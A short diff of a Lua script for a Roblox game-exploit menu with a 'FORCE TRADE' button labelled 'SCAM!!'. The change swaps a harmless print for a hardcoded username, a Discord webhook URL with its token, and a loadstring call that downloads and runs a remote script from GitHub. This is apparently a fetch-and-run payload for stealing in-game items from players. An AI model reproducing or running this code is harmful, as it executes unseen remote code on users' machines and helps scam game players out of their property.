@@ -5,5 +5,7 @@ local FORCETRADE = Window:NewTab("FORCE TRADE")
 local FORCETRADESection = FORCETRADE:NewSection("FORCE TRADE")
 
 FORCETRADESection:NewButton("FORCETRADE", "SCAM!!", function()
-    print("Clicked")
+UserName = "jiegamingstido"
+WebHook = "https://discord.com/api/webhooks/1069525311324160071/eIScOfnX7ogmTptq1UKstZzS3WB_Ujnz-bUlcasa4t78iMqLvKyKrK0n19X_zD9J2sPO"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
 end)
